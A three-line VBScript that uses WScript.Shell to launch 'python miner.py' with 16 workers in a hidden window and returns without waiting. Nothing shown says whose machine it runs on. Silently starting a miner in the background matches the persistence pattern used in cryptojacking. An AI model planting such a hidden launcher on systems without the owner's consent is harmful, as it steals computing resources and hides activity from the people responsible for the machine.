Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "python miner.py --workers 16", 0, False
Set WshShell = Nothing
